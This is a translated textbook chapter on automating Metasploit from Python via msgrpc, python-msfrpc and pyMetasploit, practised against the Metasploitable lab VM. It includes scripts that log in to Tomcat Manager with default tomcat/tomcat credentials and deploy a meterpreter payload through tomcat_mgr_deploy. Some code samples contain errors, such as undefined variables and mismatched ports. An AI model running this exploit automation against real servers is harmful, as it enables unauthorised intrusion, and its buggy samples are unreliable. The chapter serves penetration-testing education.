本章的示例和源代码可在 GitHub 存储库的`chapter9`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)[.](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)

您需要在本地机器上安装至少 4GB 内存的 Python 发行版。在本章中，我们将使用一个虚拟机进行一些与端口分析和漏洞检测相关的测试。可以从 sourceforge 页面下载：[`sourceforge.net/projects/Metasploitable/files/Metasploitable2`](https://sourceforge.net/projects/metasploitable/files/Metasploitable2)。

要登录，您必须使用 msfadmin 作为用户名和密码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/fd4a5855-2f1e-4aee-b971-2e4dfdcc22e0.png)

Metasploitable 是由 Metasploit 组创建的虚拟机，其中包含 Ubuntu 8.04 系统的镜像，故意配置不安全和存在漏洞的服务，可以使用 Metasploit Framework 进行利用。这个虚拟机旨在练习 Metasploit 提供的多种选项，对于在受控环境中执行测试非常有帮助。

# 介绍 Metasploit 框架

在本节中，我们将回顾 Metasploit 作为当今最常用的工具之一，它允许对服务器进行攻击和利用漏洞，以进行渗透测试。

# 介绍利用

利用阶段是获得对系统控制的过程。这个过程可以采取许多不同的形式，但最终目标始终是相同的：获得对袭击计算机的管理员级访问权限。

利用是最自由执行的阶段，因为每个系统都是不同和独特的。根据情况，攻击向量因目标不同而异，因为不同的操作系统、不同的服务和不同的进程需要不同类型的攻击。熟练的攻击者必须了解他们打算利用的每个系统的细微差别，最终他们将能够执行自己的利用。

# Metasploit 框架

Metasploit 是执行真实攻击和利用漏洞的框架。基本上，我们需要启动服务器并连接到 Metasploit 控制台。对于每个需要执行的命令，我们需要创建一个控制台会话来执行利用。

Metasploit 框架允许外部应用程序使用工具本身集成的模块和利用。为此，它提供了一个插件服务，我们可以在执行 Metasploit 的机器上构建，并通过 API 执行不同的模块。为此，有必要了解 Metasploit Framework API（Metasploit 远程 API），可在[`community.rapid7.com/docs/DOC-1516`](https://community.rapid7.com/docs/DOC-1516)上找到。

# Metasploit 架构

Metasploit 架构的主要组件是由 Rex、framework-core 和 framework-base 组成的库。架构的其他组件是接口、自定义插件、协议工具、模块和安全工具。包括的模块有利用、有效载荷、编码器、NOPS 和辅助。

在这个图表中，我们可以看到主要的模块和 Metasploit 架构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/6bb099b4-0910-4d68-b08b-c9b60fdc3711.png)

Metasploit 架构的主要模块是：

+   Rex: 大多数框架执行的任务的基本库。它负责处理诸如连接到网站（例如，当我们在网站中搜索敏感文件时）、套接字（负责从我们的计算机到 SSH 服务器的连接，例如）和许多与 SSL 和 Base64 相关的类似实用程序的事情。

+   MSF :: Core: 它总体上定义了框架的功能（模块、利用和有效载荷的工作方式）

+   MSF :: Base: 与 MSF :: Core 类似工作，主要区别在于它对开发人员更友好和简化。

+   插件: 扩展框架功能的工具，例如，它们允许我们集成第三方工具，如 Sqlmap、OpenVas 和 Nexpose。

+   工具: 通常有用的几个工具（例如，“list_interfaces”显示我们的网络接口的信息，“virustotal”通过 virustotal.com 数据库检查任何文件是否感染）。

+   接口: 我们可以使用 Metasploit 的所有接口。控制台版本、Web 版本、GUI 版本（图形用户界面）和 CLI，Metasploit 控制台的一个版本。

+   模块: 包含所有利用、有效载荷、编码器、辅助、nops 和 post 的文件夹。

+   利用: 利用特定软件中的一个或多个漏洞的程序；通常用于获取对系统的访问权限并对其进行控制。

+   有效载荷: 一种程序（或“恶意”代码），它伴随利用一起在利用成功后执行特定功能。选择一个好的有效载荷是一个非常重要的决定，当涉及到利用和维持在系统中获得的访问级别时。在许多系统中，有防火墙、防病毒软件和入侵检测系统，可能会阻碍一些有效载荷的活动。因此，通常使用编码器来尝试规避任何防病毒软件或防火墙。

+   编码器: 提供编码和混淆我们在利用成功后将使用的有效载荷的算法。

+   Aux: 允许与漏洞扫描器和嗅探器等工具进行交互。为了获取关于目标的必要信息，以确定可能影响它的漏洞，这种类型的工具对于在目标系统上建立攻击策略或在安全官员的情况下定义防御措施以减轻对易受攻击系统的威胁是有用的。

+   Nops: 一条汇编语言指令，除了增加程序的计数器外，不做任何事情。

除了这里描述的工作模块，Metasploit 框架还有四种不同的用户界面：msfconsole（Metasploit 框架控制台）、msfcli（Metasploit 框架客户端）、msfgui（Metasploit 框架图形界面）和 msfweb（Metasploit 框架的服务器和 Web 界面）。

接下来的部分将重点放在**Metasploit 框架控制台界面**上，尽管使用任何其他界面都可以提供相同的结果。

# 与 Metasploit 框架交互

在这一部分，我们将介绍与 Metasploit 框架交互的`msfconsole`，展示获取利用和有效载荷模块的主要命令。

# msfconsole 简介

`Msfconsole`是我们可以用来与模块交互和执行利用的工具。这个工具默认安装在 Kali linux 发行版中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/75680b5c-eee1-4119-a6fa-8b33019f2fe8.png)

# 介绍 Metasploit 利用模块

如前面在“介绍 Metasploit 框架”部分中所解释的，利用是允许攻击者利用易受攻击的系统并破坏其安全性的代码，这可能是操作系统或其中安装的一些软件中的漏洞。

Metasploit 的`exploit`模块是 Metasploit 中的基本模块，用于封装一个利用，用户可以使用单个利用来针对许多平台。该模块带有简化的元信息字段。

在 Metasploit 框架中，有大量的利用默认情况下已经存在，可以用于进行渗透测试。

要查看 Metasploit 的利用，可以在使用该工具时使用`show exploits`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d1c475e6-f4b2-4c5e-8981-c9f99820ac7d.png)

在 Metasploit 框架中利用系统的五个步骤是：

1.  配置活动利用

1.  验证利用选项

1.  选择目标

1.  选择负载

1.  启动利用

# 介绍 Metasploit 负载模块

`负载`是在系统中被攻破后运行的代码，主要用于在攻击者的机器和受害者的机器之间建立连接。负载主要用于执行命令，以便访问远程机器。

在 Metasploit 框架中，有一组可以在利用或`辅助`模块中使用和加载的负载。

要查看可用内容，请使用`show payloads`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3c5c2a69-00f7-4121-a894-835e30f8e332.png)

在 Metasploit 环境中可用的有**generic/shell_bind_tcp**和**generic/shell_reverse_tcp**，两者都通过提供一个 shell 与受害者的机器建立连接，从而为攻击者提供用户界面以访问操作系统资源。它们之间的唯一区别是，在第一种情况下，连接是从攻击者的机器到受害者的机器，而在第二种情况下，连接是从受害者的机器建立的，这要求攻击者的机器有一个监听以检测该连接的程序。

**反向 shell**在检测到目标机器的防火墙或 IDS 阻止传入连接时最有用。有关何时使用反向 shell 的更多信息，请查看[`github.com/rapid7/Metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit`](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)。

此外，我们还可以找到其他负载，如**meterpreter/bind_tcp**和**meterpreter/reverse_tcp**，它们提供一个 meterpreter 会话；它们与 shell 相关的负载的区别相同，即它们的连接建立方式不同。

# 介绍 msgrpc

第一步是使用`msgrpc`插件启动服务器的实例。为此，您可以从`msfconsole`加载模块，或直接使用`msfrpcd`命令。首先，您需要加载`msfconsole`并启动`msgrpc`服务：

```py
./msfconsole

msfconsole msf exploit(handler) > load msgrpc User = msf Pass = password
[*] MSGRPC Service: 127.0.0.1:55553
[*] MSGRPC Username: user
[*] MSGRPC Password: password
[*] Successfully loaded plugin: msgrpc msf exploit(handler) >
```

通过这种方式，我们加载进程以响应来自另一台机器的请求：

```py
./msfrpcd -h

Usage: msfrpcd <options>
OPTIONS:
-P <opt> Specify the password to access msfrpcd
-S Disable SSL on the RPC socket
-U <opt> Specify the username to access msfrpcd
-a <opt> Bind to this IP address
-f Run the daemon in the foreground
-h Help banner
-n Disable database
-p <opt> Bind to this port instead of 55553
-u <opt> URI for web server
```

通过这个命令，我们可以执行连接到 msfconsole 的进程，参数是`username`（`-U`），`password`（`-P`）和`port`（`-p`）监听服务的端口：

```py
./msfrpcd -U msf -P password -p 55553 -n -f
```

通过这种方式，Metasploit 的 RPC 接口正在端口 55553 上监听。我们可以从 Python 脚本与诸如`python-msfrpc`和`pyMetasploit`之类的模块进行交互。与 MSGRPC 的交互几乎与与 msfconsole 的交互相似。

该服务器旨在作为守护程序运行，允许多个用户进行身份验证并执行特定的 Metasploit 框架命令。在上面的示例中，我们使用`msf`作为名称和密码作为密码，在端口 55553 上启动我们的`msfrpcd`服务器。

# 连接 Metasploit 框架和 Python

在本节中，我们将介绍 Metasploit 以及如何将该框架与 Python 集成。Metasploit 用于开发模块的编程语言是 Ruby，但是使用 Python 也可以利用此框架的好处，这要归功于诸如`python-msfrpc`之类的库。

# MessagePack 简介

在开始解释此模块的操作之前，了解 MSGRPC 接口使用的 MessagePack 格式是很方便的。

MessagePack 是一种专门用于序列化信息的格式，它允许消息更紧凑，以便在不同机器之间快速传输信息。它的工作方式类似于 JSON；但是，由于数据是使用 MessagePack 格式进行序列化，因此消息中的字节数大大减少。

要在 Python 中安装`msgpack`库，只需从 MessagePack 网站下载软件包，并使用安装参数运行`setup.py`脚本。我们还可以使用`pip install msgpack-python`命令进行安装。

有关此格式的更多信息，请查询官方网站：[`msgpack.org`](http://msgpack.org)

在此屏幕截图中，我们可以看到支持此工具的 API 和语言：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/2f56099e-531a-4621-8398-a2f110cb2dc6.png)

Metasploit 框架允许外部应用程序通过使用 MSGRPC 插件来使用模块和利用。此插件在本地机器上引发 RPC 服务器的一个实例，因此可以从网络中的任何点利用 Metasploit 框架提供的所有功能。该服务器的操作基于使用 MessagePack 格式对消息进行序列化，因此需要使用此格式的 Python 实现，这可以通过使用`msgpack`库来实现。

另一方面，`python-msfrpc`库负责封装与 MSGRPC 服务器和使用 msgpack 的客户端交换包的所有细节。通过这种方式，可以在任何 Python 脚本和 msgrpc 接口之间进行交互。

# 安装 python-msfrpc

您可以从[github.com/SpiderLabs/msfrpc](http://github.com/SpiderLabs/msfrpc)存储库安装`python-msfrpc`库，并使用安装选项执行`setup.py`脚本：[`github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc`](https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc)。

该模块旨在允许与 Metasploit msgrpc 插件进行交互，以允许远程执行 Metasploit 命令和脚本。

要验证这两个库是否已正确安装，请使用 Python 解释器导入每个主要模块，并验证是否没有错误。

您可以在 Python 解释器中执行以下命令来验证安装：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/478bdb6a-75e0-46a8-853e-f1df4ec12f62.png)

安装 msfrpc 的另一种选择是从 SpiderLabs GitHub 存储库获取`msfrpc Python`模块的最新版本，并使用`setup.py`脚本：

```py
git clone git://github.com/SpiderLabs/msfrpc.git msfrpc
cd msfrpc/python-msfrpc
python setup.py install
```

现在服务正在运行并等待来自客户端的连接，从 Python 脚本中，我们可以直接使用`msfrpc`库进行连接。我们的下一步是编写我们的代码来**连接到 Metasploit**，并与系统进行身份验证：

```py
import msfrpc

# Create a new instance of the Msfrpc client with the default options
client = msfrpc.Msfrpc({'port':55553})

# Login to the msfmsg server
client.login(user,password)
```

要与 Metasploit 服务器进行交互，需要了解允许远程控制 Metasploit 框架实例的 API，也称为 Metasploit 远程 API。该规范包含与 MSGRPC 服务器进行交互所需的功能，并描述了社区版本框架的用户可以实现的功能。

官方指南可在[`Metasploit.help.rapid7.com/docs/rpc-api`](https://metasploit.help.rapid7.com/docs/rpc-api)和[`Metasploit.help.rapid7.com/docs/sample-usage-of-the-rpc-api`](https://metasploit.help.rapid7.com/docs/sample-usage-of-the-rpc-api)找到。

以下脚本显示了一种实际示例，说明了在经过身份验证后如何与服务器进行交互。在主机参数中，您可以使用 localhost，如果 Metasploit 实例在本地机器上运行，则可以使用`127.0.0.1`，或者您可以指定远程地址。如您所见，使用`call`函数允许我们指示要执行的函数及其相应的参数。

您可以在`msfrpc_connect.py`文件中的`msfrpc`文件夹中找到以下代码：

```py
import msfrpc

client = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':'5553', 'host':'127.0.0.1', 'ssl': True})
auth = client.login('msf','password')
    if auth:
        print str(client.call('core.version'))+'\n'
        print str(client.call('core.thread_list', []))+'\n'
        print str(client.call('job.list', []))+'\n'
        print str(client.call('module.exploits', []))+'\n'
        print str(client.call('module.auxiliary', []))+'\n'
        print str(client.call('module.post', []))+'\n'
        print str(client.call('module.payloads', []))+'\n'
        print str(client.call('module.encoders', []))+'\n'
        print str(client.call('module.nops', []))+'\n'
```

在上一个脚本中，使用了 API 中可用的几个函数，这些函数允许我们建立配置值并获取 exploits 和`auxiliary`模块。

也可以以通常使用 msfconsole 实用程序的方式与框架进行交互，只需要使用`console.create`函数创建控制台的实例，然后使用该函数返回的控制台标识符。

要创建一个新的控制台，请将以下代码添加到脚本中：

```py
try:        
    res = client.call('console.create')        
    console_id = res['id']
except:        
    print "Console create failed\r\n"        
    sys.exit()
```

# 执行 API 调用

`call`方法允许我们从 Metasploit 内部调用通过 msgrpc 接口公开的 API 元素。对于第一个示例，我们将请求从服务器获取所有 exploits 的列表。为此，我们调用`module.exploits`函数：

`＃从服务器获取 exploits 列表`

`mod = client.call('module.exploits')`

如果我们想找到所有兼容的有效载荷，我们可以调用`module.compatible_payloads`方法来查找与我们的 exploit 兼容的有效载荷：

＃获取第一个选项的兼容有效载荷列表

`ret = client.call('module.compatible_payloads',[mod['modules'][0]])`

在此示例中，我们正在获取此信息并获取第一个选项的兼容有效载荷列表。

您可以在`msfrpc_get_exploits.py`文件中的`msfrpc`文件夹中找到以下代码：

```py
import msfrpc

username='msf'
password=’password’

# Create a new instance of the Msfrpc client with the default options
client = msfrpc.Msfrpc({'port':55553})

# Login in Metasploit server
client.login(username,password)

# Get a list of the exploits from the server
exploits = client.call('module.exploits')

# Get the list of compatible payloads for the first option
payloads= client.call('module.compatible_payloads',[mod['modules'][0]])
for i in (payloads.get('payloads')):
    print("\t%s" % i)
```

我们还有命令可以在 Metasploit 控制台中启动会话。为此，我们使用调用函数传递`console.create`命令作为参数，然后我们可以在该控制台上执行命令。命令可以从控制台或文件中读取。在这个例子中，我们正在从文件中获取命令，并且对于每个命令，我们在创建的控制台中执行它。

您可以在`msfrpc_create_console.py`文件中的`msfrpc`文件夹中找到以下代码：

```py
# -*- encoding: utf-8 -*-
import msfrpc
import time

client = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':'5553', 'host':'127.0.0.1', 'ssl': True})
auth = client.login('msf','password')

if auth:

    console = client.call('console.create')
    #read commands from the file commands_file.txt
    file = open ("commands_file.txt", 'r')
    commands = file.readlines()
    file.close()

    # Execute each of the commands that appear in the file
    print(len(commands))
    for command in commands:
        resource = client.call('console.write',[console['id'], command])
        processData(console['id'])
```

此外，我们需要一种方法来检查控制台是否准备好获取更多信息，或者是否有错误被打印回给我们。我们可以使用我们的`processData`方法来实现这一点。我们可以定义一个函数来读取执行命令的输出并显示结果：

```py
def processData(consoleId):
    while True:
        readedData = self.client.call('console.read',[consoleId])
        print(readedData['data'])
        if len(readedData['data']) > 1:
            print(readedData['data'])
        if readedData[‘busy’] == True:
            time.sleep(1)
            continue
        break
```

# 利用 Metasploit 的 Tomcat 服务

在**Metasploitable**虚拟机环境中安装了一个 Apache Tomcat 服务，该服务容易受到远程攻击者的多种攻击。第一种攻击可以是暴力破解，从一个单词列表开始，尝试捕获 Tomcat 应用程序管理器的访问凭据（Tomcat 应用程序管理器允许我们查看和管理服务器中安装的应用程序）。如果执行此模块成功，它将提供有效的用户名和密码以访问服务器。

在 Metasploit Framework 中，有一个名为`tomcat_mgr_login`的`auxiliary`模块，如果执行成功，将为攻击者提供访问 Tomcat Manager 的用户名和密码。

使用`info`命令，我们可以看到执行模块所需的选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/75336c52-cfbe-460a-bda4-8b0feac20533.png)

在此屏幕截图中，我们可以看到需要设置的参数以执行模块：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/acf10566-11b0-48e4-b3f2-17c66da734e4.png)

一旦选择了`auxiliary/scanner/http/tomcat_mgr_login`模块，就需要根据您想要进行的分析深度来配置参数，例如`STOP_ON_SUCCESS = true`，`RHOSTS = 192.168.100.2`，`RPORT = 8180`，`USER_FILE`和`USERPASS_FILE`；然后执行。

执行后，**结果是用户名为 tomcat，密码也是 tomcat**，再次显示了弱用户名和密码的漏洞。有了这个结果，您可以访问服务器并上传文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/4a65241a-5e9b-4b5f-9f2d-5cb30831aab1.png)

# 使用 tomcat_mgr_deploy 利用。

Tomcat 可能受到的另一种攻击是名为 Apache Tomcat Manager Application Deployer Authenticated Code Execution 的利用。此利用与 Tomcat 中的一个漏洞相关，被标识为 CVE-2009-3843，严重程度很高（10）。此漏洞允许在服务器上执行先前加载为.war 文件的有效负载。为了执行该利用，需要通过`auxiliary`模块或其他途径获得用户及其密码。该利用位于`multi/http/tomcat_mgr_deploy`路径中。

在`msf>`命令行中输入：`use exploit/multi/http/tomcat_mgr_deploy`

一旦加载了利用，您可以输入`show payloads`和`show options`来配置工具：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f58f0ef7-5cf9-47b8-a8b0-192fe0f44c01.png)

通过**show options**，我们可以看到执行模块所需的参数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/807d2b1d-38d9-4190-b6b2-05a56953a20b.png)

要使用它，执行`exploit/multi/http/tomcat_mgr_deploy`命令。配置必要的参数：`RPORT = 8180, RHOST = 192.168.100.2, USERNAME = tomcat, PASSWORD = tomcat`，选择`java/meterpreter/bind_tcp`有效负载，建立一个 meterpreter 会话并执行利用。

成功执行利用后，通过`meterpreter`命令解释器建立了连接，提供了一系列有用的选项，以在受攻击的系统内部提升权限。

一旦启动，shell 将回拨其主机并允许其以被利用服务的任何权限输入命令。我们将使用 Java 有效负载来实现 MSF 中的功能。

在下一个脚本中，我们正在自动化这个过程，设置参数和有效负载，并使用 exploit 选项执行模块。

`RHOST`和`RPORT`参数可以通过`optparse`模块在命令行中给出。

您可以在`msfrpc`文件夹中的`exploit_tomcat.py`文件中找到以下代码：

```py
import msfrpc
import time

def exploit(RHOST, RPORT):
    client = msfrpc.Msfrpc({})
    client.login('msf', 'password')
    ress = client.call('console.create')
    console_id = ress['id']

    ## Exploit TOMCAT MANAGER ##
    commands = """use exploit/multi/http/tomcat_mgr_deploy
    set PATH /manager
    set HttpUsername tomcat
    set HttpPassword tomcat
    set RHOST """+RHOST+"""
    set RPORT """+RPORT+"""
    set payload java/meterpreter/bind_tcp
    exploit
    """

    print("[+] Exploiting TOMCAT MANAGER on: "+RHOST)
    client.call('console.write',[console_id,commands])
    res = client.call('console.read',[console_id])
    result = res['data'].split('n')

def main():
    parser = optparse.OptionParser(sys.argv[0] +' -h RHOST -p LPORT')parser.add_option('-h', dest='RHOST', type='string', help='Specify a remote host')
    parser.add_option('-p', dest='LPORT', type='string', help ='specify a port to listen ')
    (options, args) = parser.parse_args()
    RHOST=options.RHOST
    LPORT=options.LPORT

    if (RHOST == None) and (RPORT == None):
        print parser.usage
        sys.exit(0)

    exploit(RHOST, RPORT)

if __name__ == "__main__":
    main()
```

# 将 Metasploit 与 pyMetasploit 连接

在本节中，我们将回顾 Metasploit 以及如何将此框架与 Python 集成。Metasploit 中用于开发模块的编程语言是 ruby，但是使用 Python 也可以利用诸如**pyMetasploit**之类的库来利用此框架的好处。

# PyMetasploit 简介

PyMetasploit 是 Python 的`msfrpc`库，允许我们使用 Python 自动化利用任务。它旨在与最新版本的 Metasploit 一起提供的 msfrpcd 守护程序进行交互。因此，在您开始使用此库之前，您需要初始化 msfrpcd 并且（强烈建议）初始化 PostgreSQL：[`github.com/allfro/pyMetasploit`](https://github.com/allfro/pymetasploit)。

我们可以使用`setup.py`脚本安装从源代码安装模块：

```py
$ git clone https://github.com/allfro/pyMetasploit.git $ cd pyMetasploit
$ python setup.py install
```

安装完成后，我们可以在脚本中导入模块并与`MsfRpcClient`类建立连接：

```py
>>> from Metasploit.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('password',user='msf')
```

# 从 Python 与 Metasploit 框架进行交互

**MsfRpcClient**类提供了浏览 Metasploit 框架的核心功能。

与 Metasploit 框架一样，MsfRpcClient 分为不同的管理模块：

+   **auth：** 管理 msfrpcd 守护程序的客户端身份验证。

+   **consoles：** 管理由 Metasploit 模块创建的控制台/Shell 的交互。

+   **core：** 管理 Metasploit 框架核心。

+   **db：** 管理 msfrpcd 的后端数据库连接。

+   **模块：** 管理 Metasploit 模块（如 exploits 和 auxiliaries）的交互和配置。

+   **plugins：** 管理与 Metasploit 核心关联的插件。

+   **sessions：** 管理与 Metasploit meterpreter 会话的交互。

就像 Metasploit 控制台一样，您可以检索所有可用的模块编码器、有效载荷和 exploits 的列表：

```py
>>> client.modules.auxiliary
 >>> client.modules.encoders
 >>> client.modules.payloads
 >>> client.modules.post
```

这将列出 exploit 模块：

`exploits = client.modules.exploits`

我们可以使用`use`方法激活其中一个 exploit：

`scan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')`

与`python-msfprc`一样，使用此模块，我们还可以连接到控制台并像在 msfconsole 中那样运行命令。我们可以通过两种方式实现这一点。第一种是在激活 exploit 后使用 scan 对象。第二种是使用 console 对象以与 msfconsole 交互时相同的方式执行命令。

您可以在`pyMetasploit`文件夹中的`exploit_tomcat_maanger.py`文件中找到以下代码：

```py
from Metasploit.msfrpc import MsfRpcClient
from Metasploit.msfconsole import MsfRpcConsole

client = MsfRpcClient('password', user='msf')

exploits = client.modules.exploits
for exploit in exploits:
    print("\t%s" % exploit)

scan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')
scan.description
scan.required
scan['RHOST'] = '192.168.100.2'
scan['RPORT'] = '8180'
scan['PATH'] = '/manager'
scan['HttpUsername'] = 'tomcat'
scan['HttpPassword'] = 'tomcat'
scan['payload'] = 'java/meterpreter/bind_tcp'
print(scan.execute())

console = MsfRpcConsole(client)
console.execute('use exploit/multi/http/tomcat_mgr_deploy')
console.execute('set RHOST 192.168.100.2')
console.execute('set RPORT 8180')
console.execute('set PATH /manager')
console.execute('set HttpUsername tomcat')
console.execute('set HttpPassword tomcat')
console.execute('set payload java/meterpreter/bind_tcp')
console.execute('run')
```

# 总结

本章的一个目标是了解 Metasploit 框架作为利用漏洞的工具，以及如何在 Python 中与 Metasploit 控制台进行程序化交互。使用诸如 Python-msfrpc 和 pyMetasploit 之类的模块，可以自动执行在 Metasploit 框架中找到的模块和 exploits。

在下一章中，我们将探讨在 Metasploitable 虚拟机中发现的漏洞，以及如何连接到漏洞扫描器（如`nessus`和`nexpose`）以从 Python 模块中提取这些漏洞。

# 问题

1.  在 Metasploit 中与模块进行交互和执行 exploits 的接口是什么？

1.  使用 Metasploit 框架利用系统的主要步骤是什么？

1.  使用 Metasploit 框架在客户端和 Metasploit 服务器实例之间交换信息的接口名称是什么？

1.  `generic/shell_bind_tcp`和`generic/shell_reverse_tcp`之间有什么区别？

1.  我们可以执行哪个命令来连接到 msfconsole？

1.  我们需要使用哪个函数以与 msfconsole 实用程序相同的方式与框架进行交互？

1.  使用 Metasploit 框架在客户端和 Metasploit 服务器实例之间交换信息的远程访问接口名称是什么？

1.  我们如何可以获得 Metasploit 服务器上所有 exploits 的列表？

1.  在 Metasploit 框架中，哪些模块可以访问 tomcat 中的应用程序管理器并利用 apache tomcat 服务器以获取会话 meterpreter？

1.  当在 tomcat 服务器中执行漏洞利用时，建立 meterpreter 会话的有效负载名称是什么？

# 进一步阅读

在这些链接中，您将找到有关诸如 kali linux 和 Metasploit 框架的工具的更多信息，以及我们用于脚本执行的 Metasploitable 虚拟机的官方文档：

+   [`docs.kali.org/general-use/starting-Metasploit-framework-in-kali`](https://docs.kali.org/general-use/starting-Metasploit-framework-in-kali)

+   [`github.com/rapid7/Metasploit-framework`](https://github.com/rapid7/Metasploit-framework)

+   [`information.rapid7.com/Metasploit-framework.html`](https://information.rapid7.com/Metasploit-framework.html)

自动漏洞利用程序：此工具使用子进程模块与 Metasploit 框架控制台进行交互，并自动化了一些您可以在 msfconsole 中找到的漏洞利用：[`github.com/anilbaranyelken/arpag`](https://github.com/anilbaranyelken/arpag)。
